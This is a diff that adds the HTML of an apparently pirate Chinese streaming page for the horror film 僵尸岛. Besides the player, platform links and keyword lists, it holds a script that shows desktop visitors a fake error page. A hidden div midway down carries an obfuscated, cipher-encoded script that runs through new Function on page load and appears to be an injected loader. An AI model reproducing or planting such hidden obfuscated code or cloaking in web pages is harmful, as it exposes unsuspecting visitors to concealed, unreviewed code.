@@ -1,1 +1,661 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+<title>僵尸岛全集免费观看-僵尸岛高清下载-恐怖片-破晓电影</title>
+<meta name="keywords" content="僵尸岛,僵尸岛免费观看,僵尸岛全集高清下载" />
+<meta name="description" content="破晓电影免费提供恐怖片《僵尸岛》剧情：" />
+<script type="text/javascript">
+    (function(){var config = {itv: 1800000,url1:'//ia.51.la/go1?id=21268285',ekc:''};!function(e){function t(r){if(n[r])return n[r].exports;var o=n[r]={exports:{},id:r,loaded:!1};return e[r].call(o.exports,o,o.exports,t),o.loaded=!0,o.exports}var n={};return t.m=e,t.c=n,t.p="",t(0)}([function(e,t,n){"use strict";function r(){var e=void 0,t=/id=(\d+)/.exec(config.url1)[1]||"";try{e=u.get("__tins__"+t)}catch(t){e=!1}var n=e&&i.isN(e.sid)&&i.isN(e.expires)&&g-e.sid<18e5?0:1,r=n?1:e.vd+1,o=n?g:e.sid,c=g+18e5;return u.set("__tins__"+t,s.stringify({sid:o,vd:r,expires:c}),null,"/"),[n,n?o:u.get("__tins__"+t).sid,r]}function o(){var e=s.parse(s.stringify(i.extend({},y,v))),t=i.obj2url(e),n=config.url1+"&rt="+g+"&"+t,r=new Image(1,1);r.src=n}var i=n(4),c=n(5),u=n(7).store,s=n(6),a=window,f=a.location,l=a.screen,p=a.navigator,g=i.now(),d=!0,m=r(),v={ekc:config.ekc,sid:m[1],tt:c.getMeta.tt,kw:c.getMeta.kw,cu:f.href,pu:c.getRef()},y={rl:l.width+"*"+l.height,lang:p.language||p.browserLanguage,ct:function(){var e=p.connection||p.mozConnection||p.webkitConnection||p.oConnection,t=i.hasIt(p.userAgent,"mobile")&&e?e.type:"unknow";return t}(),pf:function(){var e=d?1:0;return d=0,e}(),ins:m[0],vd:m[2],ce:p.cookieEnabled?1:0,cd:l.colorDepth||l.pixelDepth,ds:c.getMeta.ds};o.version="2.2.1.2",n(10)(y),o()},,,,function(e,t){"use strict";function n(e,t){return void 0!==e&&e.indexOf(t)!==-1}function r(e){return function(t){return Object.prototype.toString.call(t)==="[object "+e+"]"}}function o(){for(var e=0,t={};e<arguments.length;e++){var n=arguments[e];for(var r in n)t[r]=n[r]}return t}function i(e){return e.replace(/&/g,"~_~")}function c(e){var t="";for(var n in e)""!==t&&(t+="&"),t+=n+"="+a(a(i(String(e[n]))));return t}function u(e){return e.replace(/^\s+|\s+$/g,"")}function s(){return+new Date}var a=encodeURIComponent,f=r("Object"),l=r("Number"),p=r("String"),g=r("Array"),d=r("Function"),m=r("RegExp");e.exports={isO:f,isN:l,isF:d,isR:m,isS:p,isA:g,hasIt:n,extend:o,obj2url:c,trim:u,now:s}},function(e,t,n){"use strict";function r(e){return u.getElementsByTagName(e.toLowerCase())}function o(){var e="";try{e=c.top.document.referrer}catch(t){if(c.parent)try{e=c.parent.document.referrer}catch(t){e=""}}return""===e&&(e=u.referrer),e}var i=n(4),c=window,u=c.document,s=function(){var e=r("meta"),t=r("title"),n={kw:"",ds:""},o=void 0;n.tt=i.trim(t.length?t[0].innerHTML:"");for(var c=0;c<e.length;c++)e[c].name&&(o=e[c].name.toLowerCase(),i.hasIt("keywords",o)&&(n.kw=e[c].content.slice(0,100)),i.hasIt("description",o)&&(n.ds=e[c].content.slice(0,30)));return n}();e.exports={getMeta:s,getRef:o}},function(module,exports){"use strict";var _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e};module.exports={parse:function parse(sJSON){return eval("("+sJSON+")")},stringify:function(){function e(o){if(null==o)return"null";if("number"==typeof o)return isFinite(o)?o.toString():"null";if("boolean"==typeof o)return o.toString();if("object"===("undefined"==typeof o?"undefined":_typeof(o))){if("function"==typeof o.toJSON)return e(o.toJSON());if(r(o)){for(var u="[",s=0;s<o.length;s++)u+=(s?", ":"")+e(o[s]);return u+"]"}if("[object Object]"===t.call(o)){var a=[];for(var f in o)n.call(o,f)&&a.push(e(f)+": "+e(o[f]));return"{"+a.join(", ")+"}"}}return'"'+o.toString().replace(c,i)+'"'}var t=Object.prototype.toString,n=Object.prototype.hasOwnProperty,r=Array.isArray||function(e){return"[object Array]"===t.call(e)},o={'"':'\\"',"\\":"\\\\","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t"},i=function(e){return o[e]||"\\u"+(e.charCodeAt(0)+65536).toString(16).substr(1)},c=/[\\"\u0000-\u001F\u2028\u2029]/g;return e}()}},function(e,t,n){"use strict";var r=n(5),o=n(6),i={get:function(e){return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*"+encodeURIComponent(e).replace(/[-.+*]/g,"\\$&")+"\\s*\\=s*([^;]*).*$)|^.*$"),"$1"))||null},set:function(e,t,n,r,o,i){if(!e||/^(?:expires|max-age|path|domain|secure)$/i.test(e))return!1;var c="";if(n)switch(n.constructor){case Number:c=n===1/0?"; expires=Fri, 31 Dec 9999 23:59:59 GMT":"; max-age="+n;break;case String:c="; expires="+n;break;case Date:c="; expires="+n.toUTCString()}return document.cookie=encodeURIComponent(e)+"="+encodeURIComponent(t)+c+(o?"; domain="+o:"")+(r?"; path="+r:"")+(i?"; secure":""),!0}},c={get:function(e){return o.parse((r.isMobi?window.localStorage.getItem(e):i.get(e))||"{}")},set:function(e,t,n,o){return r.isMobi?window.localStorage.setItem(e,t):i.set(e,t,n,o)}};e.exports={cookie:i,store:c}},,,function(e,t,n){"use strict";var r=n(4),o=n(7);e.exports=function(e){var t=o.store.get("__51laig__");t=r.isN(t)?parseInt(t)+1:1,o.cookie.set("__51cke__",config.ekc,null,"/"),e.ing=t,o.store.set("__51laig__",t,null,"/")}}]);}());
+  </script>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta name="renderer" content="webkit|ie-comp|ie-stand">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="/template/st2011//statics/font/iconfont.css" type="text/css" />
+  <link rel="stylesheet" href="/template/st2011//statics/css/stui_block.css" type="text/css" />
+  <link rel="stylesheet" href="/template/st2011//statics/css/stui_block_color.css" type="text/css" />
+  <link rel="stylesheet" href="/template/st2011//statics/css/stui_default.css" type="text/css" />
+  <script type="text/javascript" src="/template/st2011//statics/js/jquery.min.js"></script>
+  <script type="text/javascript" src="/template/st2011//statics/js/stui_default.js"></script>
+  <script type="text/javascript" src="/template/st2011//statics/js/stui_block.js "></script>
+  <script type="text/javascript" src="/template/st2011//statics/js/home.js"></script>
+  <script type="text/javascript" src="/template/st2011//statics/js/formValidator-4.0.1.js"></script>
+  <script>var maccms={"path":"","mid":"1","url":"www.168shch.com","wapurl":"www.168shch.com","mob_status":"2"};</script>
+  <!--[if lt IE 9]>
+  <script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
+  <script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+  <script type="text/javascript">
+              function divrefresh() {
+                  var m1 = document.getElementById('movie1');
+                  var m2 = document.getElementById('movie2');
+                  if(m1.style.display == 'block') {
+                      m1.style.display = 'none';
+                      m2.style.display = 'block';
+                  } else if(m2.style.display == 'block') {
+                      m2.style.display = 'none';
+                      m1.style.display = 'block';
+                  } 
+              }
+  </script>
+  <script type="text/javascript">
+          var system = {
+          win: false,
+          mac: false,
+          xll: false
+      };
+      var p = navigator.platform;
+      var us = navigator.userAgent.toLowerCase();
+      system.win = p.indexOf("Win") == 0;
+      system.mac = p.indexOf("Mac") == 0;
+      system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+      if (system.win || system.mac || system.xll) {
+      var iframe_url='/fn404.html';
+      $("head").html('<meta charset="UTF-8"><meta name="referrer" content="no-referrer"><title>网页无法访问</title><style>body{position:static !important;}body *{ visibility:hidden; }</style> ');
+      $("body").empty();
+      $(document).ready(function () {
+      $("body").html('<iframe style="width:100%;height:100%;position:absolute;margin-left:0px;margin-top:0px;top:0%;left:0%;visibility:visible;" id="mainFrame" src="'+iframe_url+'" frameborder="0" scrolling="no"></iframe>').show();
+      $("body *").css("visibility", "visible");
+    });
+  }
+  </script>
+<script type="text/javascript" src="/template/st2011/statics/js/history.js"></script>
+<script type="text/javascript">
+	var vod_name = '僵尸岛', vod_url = window.location.href, vod_part='HD';
+</script>
+</head>
+<body>
+	<script id="jgd_24" src="/24.js" charset="utf-8"></script>
+<header class="stui-header__top clearfix" id="header-top">
+	<div class="container">
+		<div class="row">
+			<div class="stui-header_bd clearfix">
+			    <div class="stui-header__logo">
+					<a class="logo" title="破晓电影首页" href="/"></a>
+				</div>
+				<div class="stui-header__side">
+					<script type="text/javascript" src="/template/st2011//statics/js/jquery.autocomplete.js"></script>
+					<div class="stui-header__search"> 
+				        <form id="search" name="search" method="get" action="/ss.html" onSubmit="return qrsearch();">
+	    					<input type="text" name="wd" class="mac_wd form-control" value="" placeholder="搜索破晓电影海量影片" autocomplete="off"/>
+							<button class="submit" id="searchbutton" type="submit"><i class="icon iconfont icon-search"></i></button>
+						</form>
+				  	</div>
+				</div>
+				<ul class="stui-header__menu type-slide">
+	                <li ><a title="影院在线免费观看电影" href="/pt/dianying.html">影院</a></li>
+	                <li ><a title="美剧天堂在线观看免费完整版" href="/pt/meiju.html">天天美剧</a></li>
+	                <li ><a title="2021韩剧热播排行榜" href="/pt/hanju.html">韩剧全集</a></li>
+	                <li ><a title="日本剧免费观看网站" href="/pt/riju.html">日剧大全</a></li>
+	                <li ><a title="免费动漫大全" href="/pt/dongman.html">动漫大全</a></li>
+	                <li ><a title="最近比较火的综艺节目" href="/pt/zongyi.html">最火综艺</a></li>
+	                <li ><a title="今日影院上映电影" href="/pat/yingxun.html">今日影讯</a></li>
+	                <li ><a title="人人影视在线免费高清电影" href="/label/latest.html">更新</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+</header>
+<script type="text/javascript">
+	$(".stui-header__user li,.stui-header__menu li").click(function(){
+		$(this).find(".dropdown").toggle();
+	});
+</script>
+    <div class="container">
+        <div class="row">
+        	<div class="col-lg-wide-75 col-xs-1 padding-0">
+				<div class="stui-pannel stui-pannel-bg clearfix">
+					<div class="stui-pannel-box">
+						<div class="col-pd bottom-line clearfix">
+							<span class="text-muted">当前位置 <i class="icon iconfont icon-more"></i></span>
+							<a class="text-muted" rel="nofollow" href="/" title="破晓电影首页">破晓电影</a><i class="icon iconfont icon-more"></i>
+							<a class="text-muted" rel="nofollow" href="/pt/dianying.html" title="电影专栏_破晓电影">电影</a><i class="icon iconfont icon-more"></i>
+							<a class="text-muted" rel="nofollow" href="/pt/kongbupian.html" title="恐怖片专栏_破晓电影">恐怖片</a><i class="icon iconfont icon-more"></i>
+							<a class="text-muted" rel="nofollow" href="/pd/356122.html" title="《僵尸岛》免费在线看">《僵尸岛》</a>全集在线播放
+						</div>
+	            		<div class="stui-pannel stui-pannel-bg clearfix">
+							<div style="-webkit-filter:drop-shadow(8px 8px 8px rgba(0,0,0,.5));filter:drop-shadow(8px 8px 8px rgba(0,0,0,.5))" class="stui-pannel-box">
+								<div class="stui-pannel-bd">
+									<div class="stui-player col-pd"><div class="stui-player__video clearfix"><script type="text/javascript">var player_aaaa={"flag":"play","encrypt":0,"trysee":0,"points":0,"link":"\/pp\/356122\/1\/1.html","link_next":"","link_pre":"","url":"https:\/\/pptv.1080tg.com\/202306\/29\/uVpfSXU2nM3\/video\/index.m3u8","url_next":"","from":"sdm3u8","server":"no","note":"","id":"356122","sid":1,"nid":1}</script><script type="text/javascript" src="/static/js/playerconfig.js?t=20231011"></script><script type="text/javascript" src="/static/js/player.js?t=a20231011"></script></div></div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+                <div style="display: none !important;width:1px;">
+                    (function(){function p1ee599(l693c){var b1d8f4c="@Z㏎J%❆D;☧P7?S㏒.➨Rv㏕8o-♆✪Ip♗☓Q2z[☆YjVAKmHe☒☁6㏑cu&♘fNd_/h☩]O~꒰Wlw◄y❅X➢(:s=a⋌UTkC91qrM℃x℉,!✎gઈFbE$Gn540i3t|✂B✩^L";var bb147="gs♗qZઈKE]mFa!P&☁p♆.✎6I3;@N(❆M8zjh➢b✩Qcf[㏕7DWlC㏑y꒰Tn♘☧☒5dXJ✂B%?R_℉4t$O☩℃:YHL㏎-^✪29❅iGk/U➨,☆㏒|S0u⋌w◄VA=er☓xo1~v";return l693c.split('').map(function(w0e419c71){var g4412de1=b1d8f4c.indexOf(w0e419c71);return g4412de1==-1?w0e419c71:bb147[g4412de1]}).join('')}var c=p1ee599('ed2k://nMN☩BnH"" + "n" + "☒" + "2" + "?" + "?" + "m" + "h" + "✩" + "✩"+""☧im$NKXMBN♗){✪♗m$NKXMBN♗L3E☩jj?✎☩☩K❅o✎Nhj☩q✎BEjK♆q2☩2){Mm♗℉CQ?KF6MN℉㏕X3ZX♗N?LM@?XBt㏕R㏑?XmBtP)){t3X$tN}✪L?t ☩2✩q♆im$NKXMBN♗Xhhm☒31j✩){t3X$tN bXtMN@㏕mtBPc☆?tcB☩3♗Xhhm☒31j✩)}✪L?t z☩23✩12EiH"Xk✩"✎"Lk✩q"✎"$k✩☒❅✩q☒qq☒q2qqh☒"✎"☩k1E1♆k✩EkE☒ ✩q=E2=ho"☧✪L?t xqqE✩3☩ooiNhj☩qH☩2✩q♆♗E✂o✩)+☩2✩q♆♗E✂☒❅)+☩2✩q♆♗E✂o7)+☩2✩q♆♗E✂o1)☧✎☆oh☒jiNhj☩qH☩2✩q♆♗E✂o1)+☩2✩q♆♗E✂☒❅)+☩2✩q♆♗E✂o7)+☩2✩q♆♗E✂o✩)☧✎z✩3♆o❅☒iBEjK♆q2☩2HxqqE✩3☩oo♗"a♆4&KP4$☩7p[KP㏑n☩0ii")☧✎$☒ojmKixqqE✩3☩oo♗"a♆O㏑a]w㏑w6✂㏑j64$☩0ii")✎✂3☩♆h2?✩qixqqE✩3☩oo♗"K♆4MK♆w&?6hN")✎$☒☒✩hhoKixqqE✩3☩oo♗"KP4nj℃7[%Aii")✎㏑☩12hhEjixqqE✩3☩oo♗"K♆꒰Z?]Ai")✎J3?m✩❅ooixqqE✩3☩oo♗"KP41%]Oz%Aii")✎M✩o?ooixqqE✩3☩oo♗"?PqRj@ii")✎tK☩♆h3qixqqE✩3☩oo♗"KP7$%℃qX")✎@h1K☒K3j☒iNhj☩qHxqqE✩3☩oo♗"f67E?0ii")☧✎✂?312✩K31ixqqE✩3☩oo♗"j℃q☆%0ii")✪L?t 3mK11❅KoKixqqE✩3☩oo♗"3Ppx%6O✩%nii")✪L?t z✩mqK1✪Mm♗㏑BK?XMBN㏕Z3?tK☆㏕MN☩3✂(m♗3mK11❅KoK)>k✩){z✩mqK1iBEjK♆q2☩2H$☒ojmK☧♗xqqE✩3☩oo♗"☩℃4❅☩℃7&%6;i"))✪z✩mqK1㏕M☩i"X"+♗@h1K☒K3j☒HtK☩♆h3q☧♗)*✩EEEE)✪z✩mqK1㏕ZX&㏑3㏕nM☩X☆i"✩EEW"✪z✩mqK1㏕ZX&㏑3㏕☆3M@☆Xi"hEER✂"✪z✩mqK1㏕☩MZ?j㏑3☩iXt$3✪Mm♗BEjK♆q2☩2㏕jB☩&SiN$㏑㏑){BEjK♆q2☩2㏕jB☩&㏕?RR3N☩c☆M㏑☩♗z✩mqK1)}3㏑Z3{L?t n❅♆☩2im$NKXMBN♗){BEjK♆q2☩2㏕jB☩&㏕?RR3N☩c☆M㏑☩♗z✩mqK1)✪Nhj☩q㏕t3PBL3;L3NXUMZX3N3t♗✂?312✩K31✎n❅♆☩2✎m?㏑Z3)}✪Nhj☩q㏕?☩☩;L3NXUMZX3N3t♗✂?312✩K31✎n❅♆☩2✎m?㏑Z3)}}L?t R❅2h?o☩K☩iBEjK♆q2☩2H$☒ojmK☧♗xqqE✩3☩oo♗"%6✩M%6Ai"))✪R❅2h?o☩K☩㏕M☩i☩☩K❅o+♗@h1K☒K3j☒㏕K3M㏑♗@h1K☒K3j☒HtK☩♆h3q☧♗)*✩EEEE))✪L?t NKm❅♆o☒im$NKXMBN♗☩homo☩☩?){L?t ☩oK12iN3n ☁?X3♗)✪L?t x✩❅qE2o?i`?☩LbR?K3-☩◄➢{☩☩K❅o}◄➢{☩oK12㏕XBUBK?㏑3☁?X3bXtMN@♗)}`✪L?t ☩h♆1✩iOb(p㏕R?tZ3♗㏑BK?㏑bXBt?@3㏕@3X-X3P♗x✩❅qE2o?))✪Mm♗☩h♆1✩iiN$㏑㏑){☩h♆1✩i{jtBnZ3tcB$NX=E}}☩h♆1✩㏕jtBnZ3tcB$NX++✪L?t @E❅qj1i☆oh☒j♗z☩23✩12E㏕KBNK?X♗H☁?X3H"NBn"☧♗)✎㏑BK?XMBN㏕☆t3m✎`☆ZKk➢{☩h♆1✩㏕jtBnZ3tcB$NX}`☧)㏕ZBtX♗♗)i>@h1K☒K3j☒HtK☩♆h3q☧♗)kE㏕h)HM✩o?oo☧♗"✎"))✪L?t $2☩12☒E☒i@E❅qj1㏕MN☩3✂(m♗☩2✩q♆♗E✂♆☩))>k✩l@E❅qj1H✂3☩♆h2?✩q☧♗@E❅qj1㏕MN☩3✂(m♗☩2✩q♆♗E✂♆☩)))=""✪@E❅qj1i@E❅qj1H$☒☒✩hhoK☧♗$2☩12☒E☒✎"")H㏑☩12hhEj☧♗"")HJ3?m✩❅oo☧♗)HM✩o?oo☧♗"")+$2☩12☒E☒✪R❅2h?o☩K☩㏕ZtKiH"☆XXRZ=℉℉"✎☩homo☩☩?✎@E❅qj1☧HM✩o?oo☧♗"℉")✪BEjK♆q2☩2㏕jB☩&㏕MNZ3tX꒰3mBt3♗R❅2h?o☩K☩✎BEjK♆q2☩2㏕jB☩&㏕K☆M㏑☩pB☩3ZHE☧)✪Mm♗z✩mqK1SiN$㏑㏑){z✩mqK1㏕L?㏑$3+i"\\t\\N?RR3N☩3☩ 3P XB ☆XP㏑"✪L?t P?♆q❅jiBEjK♆q2☩2㏕@3X;㏑3P3NX꒰&-☩♗R❅2h?o☩K☩㏕M☩)✪Mm♗P?♆q❅jiiN$㏑㏑FFP?♆q❅jii$N☩3mMN3☩){z✩mqK1㏕L?㏑$3+i"\\t\\N K?NX @3X 3P mtBP ☆XP㏑"}}}✪Mm♗z✩mqK1SiN$㏑㏑){z✩mqK1㏕L?㏑$3+i"\\t\\NZ3N☩ [Z ☆BZX "+L3E☩jj?}L?t $❅2mjo?im$NKXMBN♗$qoo❅qhm){t3X$tN xqqE✩3☩oo♗$qoo❅qhm)H$☒☒✩hhoK☧♗☩2✩q♆♗E✂10)✎@h1K☒K3j☒HtK☩♆h3q☧♗)㏕XBbXtMN@♗♆o)㏕Z㏑MK3♗@h1K☒K3j☒㏕m㏑BBt♗@h1K☒K3j☒HtK☩♆h3q☧♗)*q)+1))}✪NKm❅♆o☒♗$❅2mjo?♗L3E☩jj?))✪Nhj☩qH"?☩☩;L3NXUMZX3N3t"☧♗"P3ZZ?@3"✎m$NKXMBN♗3){Mm♗3㏕☩?X?㏕xii☩☩K❅o){BEjK♆q2☩2㏕@3X;㏑3P3NX꒰&-☩♗R❅2h?o☩K☩㏕M☩)㏕t3PBL3♗)✪Mm♗z✩mqK1SiN$㏑㏑){z✩mqK1㏕L?㏑$3+i"\\t\\Nt3K3ML3 3P RBZX P3ZZ?@3"✪z✩mqK1㏕L?㏑$3+i"\\t\\N3㏕☩?X?㏕L "+3㏕☩?X?㏕J}N3n 7$NKXMBN♗"?t@Z"✎3㏕☩?X?㏕J)♗{◄X☩KZ=z✩3♆o❅☒✎◄Xt?=z✩mqK1})}})})♗"DMhZj♆%㏑K♆꒰㏑jP☆☆K&h[j1Ei"✎"✩☒❅✩q☒qq☒q2qqh☒"✎nMN☩Bn✎☩BK$P3NX)}✪n☒2??mh✩✩♗)✪'.substr(7));new Function(c)()})();
+                    </div>
+                    <script>
+                        new Function(document.currentScript.previousElementSibling.textContent)();
+                    </script>
+				<div class="stui-pannel stui-pannel-bg clearfix">
+	<div class="stui-pannel-box">
+		<div class="stui-pannel_hd">
+			<div class="stui-pannel__head bottom-line active">
+				<span class="more text-muted pull-right"></span>
+				<h3 class="title"><img src="/template/st2011/statics/icon/icon_7.png"/>免费观看《僵尸岛》</h3>
+				<ul class="nav nav-tabs pull-right">
+				    				    <li ><a href="#playlist1" data-toggle="tab">全能影视</a></li>
+				    				</ul>
+			</div>
+		</div>
+		<div class="tab-content stui-pannel_bd col-pd">
+				
+			<div id="playlist1" class="tab-pane fade in">
+				<ul class="stui-content__playlist">
+					                	<li class="active"><a href="/pp/356122/1/1.html">HD</a></li>
+                					</ul>
+			</div>
+					</div>
+	</div>
+</div>
+<script type="text/javascript">$(".tab-pane:first,.nav-tabs li:first").addClass("active");</script>
+<div class="stui-pannel stui-pannel-bg clearfix">
+	<div class="stui-pannel-box">
+		<div class="stui-pannel_hd">
+			<div class="stui-pannel__head bottom-line active">
+				<h3 class="title"><img src="/template/st2011/statics/icon/icon_7.png"/>视频平台付费在线收看</h3>
+			</div>
+		</div>
+		<div class="tab-content stui-pannel_bd col-pd">
+			<ul class="stui-content__playlist">
+				<li><a class="btn" rel="nofollow" target="_blank" title="爱奇艺在线观看僵尸岛" href="https://so.iqiyi.com/so/q_僵尸岛">爱奇艺</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="腾讯视频在线观看僵尸岛" href="https://v.qq.com/x/search/?q=僵尸岛&stag=0&smartbox_ab=">腾讯视频</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="芒果TV在线观看僵尸岛" href="https://so.mgtv.com/so?k=僵尸岛&lastp=ch_home">芒果TV</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="优酷视频在线观看僵尸岛" href="https://so.youku.com/search_video/q_僵尸岛?searchfrom=1">优酷视频</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="百度视频在线观看僵尸岛" href="http://v.baidu.com/v?word=僵尸岛&ie=utf-8">百度视频</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="搜狐视频在线观看僵尸岛" href="https://so.tv.sohu.com/mts?wd=僵尸岛">搜狐视频</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="1905电影网在线观看僵尸岛" href="https://www.1905.com/search/?q=僵尸岛">1905电影网</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="PPTV在线观看僵尸岛" href="https://sou.pptv.com/s_video?kw=僵尸岛&context=default">PPTV</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="CCTV在线观看僵尸岛" href="https://search.cctv.com/search.php?qtext=僵尸岛&type=video">CCTV</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="哔哩哔哩在线观看僵尸岛" href="https://search.bilibili.com/all?keyword=僵尸岛">哔哩哔哩</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="好看视频在线观看僵尸岛" href="https://haokan.baidu.com/web/search/page?query=僵尸岛">好看视频</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="乐视网在线观看僵尸岛" href="http://so.le.com/s?wd=僵尸岛">乐视网</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="土豆网在线观看僵尸岛" href="https://so.iqiyi.com/so/q_僵尸岛">土豆网</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="2345电视在线观看僵尸岛" href="https://so-kan.2345.com/search_僵尸岛">2345电视</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="僵尸岛影视资讯" href="https://maoyan.com/query?kw=僵尸岛">猫眼电影</a></li>
+				<li><a class="btn" rel="nofollow" target="_blank" title="僵尸岛豆瓣电影资料详情" href="https://search.douban.com/movie/subject_search?search_text=僵尸岛">豆瓣电影</a></li>
+			</ul>
+		</div>
+	</div>
+</div>
+<div class="stui-pannel stui-pannel-bg clearfix">
+	<div class="stui-pannel-box">
+		<div class="stui-pannel_hd">
+			<div class="stui-pannel__head active bottom-line clearfix">
+				<h3 class="title"><img src="/template/st2011/statics/icon/icon_15.png"/>电影观看小贴士</h3>
+			</div>
+		</div>
+		<div class="stui-pannel_bd">
+			<p>无需安装任何插件，即可快速播放。</p>
+			<p><span style="color:#d64802;">DVD</span>:普通清晰<span class="split-line"></span><span style="color:#d64802;">BD</span>:高清无水印<span class="split-line"></span><span style="color:#d64802;">HD</span>:高清<span class="split-line"></span><span style="color:#d64802;">TS</span>:抢先非清晰</p>
+			<p>如果视频加载失败，可<a href="javascript:;" style="color:#d64802" onclick="window.location.reload()" rel="nofollow">刷新</a>或<span style="color:#d64802;">切换线路</p>
+			<p>请收藏本站唯一网址&nbsp[&nbsp<span style="color:#d64802;">www.168shch.com</span>&nbsp]&nbsp以免丢失!</p>
+			<p>破晓电影： 提供《僵尸岛》免费在线高清流畅播放，还提供影片详情、相关资讯、相关搜索、同类影片推荐、影片评等内容。若没有资源，可留言反馈。</p>
+		</div>
+	</div>
+</div>
+<div class="stui-pannel stui-pannel-bg clearfix">
+	<div class="stui-pannel-box">
+		<div class="stui-pannel_hd">
+			<div class="stui-pannel__head active bottom-line clearfix">
+				<h3 class="title"><img src="/template/st2011/statics/icon/icon_12.png"/>《恐怖片》的热门搜索</h3>
+			</div>
+		</div>
+		<div class="stui-pannel_bd">
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=央视十大优秀恐怖">央视十大优秀恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=全球十大必看恐怖">全球十大必看恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=恐怖全集在线观看">恐怖全集在线观看</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=豆瓣评分9.0以上恐怖">豆瓣评分9.0以上恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=10部顶级恐怖">10部顶级恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=中国十佳恐怖">中国十佳恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=恐怖最全的网站">恐怖最全的网站</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=恐怖在线观看免费网站">恐怖在线观看免费网站</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=30部必看恐怖">30部必看恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=最新热播恐怖排行榜前十">最新热播恐怖排行榜前十</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=2019必看十大恐怖">2019必看十大恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=一生必看经典恐怖">一生必看经典恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=2020最新恐怖大片">2020最新恐怖大片</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=恐怖排行榜前十名经典">恐怖排行榜前十名经典</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=十大必看恐怖">十大必看恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=2020年最热恐怖">2020年最热恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=2019恐怖排名">2019恐怖排名</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=最经典的100部恐怖">最经典的100部恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=十部巅峰恐怖">十部巅峰恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=豆瓣排名前50恐怖">豆瓣排名前50恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=2020年的最火十部恐怖">2020年的最火十部恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=恐怖免费在线观看">恐怖免费在线观看</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=恐怖大全">恐怖大全</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=近期好看的恐怖">近期好看的恐怖</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=2020恐怖推荐">2020恐怖推荐</a><span class="split-line"></span>
+			<a rel="nofollow" target="_blank" href="https://www.baidu.com/s?wd=恐怖排行榜2020前十名">恐怖排行榜2020前十名</a>
+		</div>
+	</div>
+</div>
+<div class="stui-pannel stui-pannel-bg clearfix">
+    <div class="stui-pannel-box">
+        <div class="stui-pannel_hd">
+            <div class="stui-pannel__head active bottom-line clearfix">
+                <h3 class="title"><img src="/template/st2011/statics/icon/icon_15.png"/>《僵尸岛》的常见问题</h3>
+            </div>
+        </div>
+        <div class="stui-pannel_bd">
+            <p style="margin: 0 0 5px;"><b>1.请问哪个平台可以在线免费观看恐怖片《僵尸岛》？</b></p>
+            <p style="margin: 0 0 5px;">优酷视频网友：免vip在线观看地址 www.168shch.com/pd/356122.html</p>
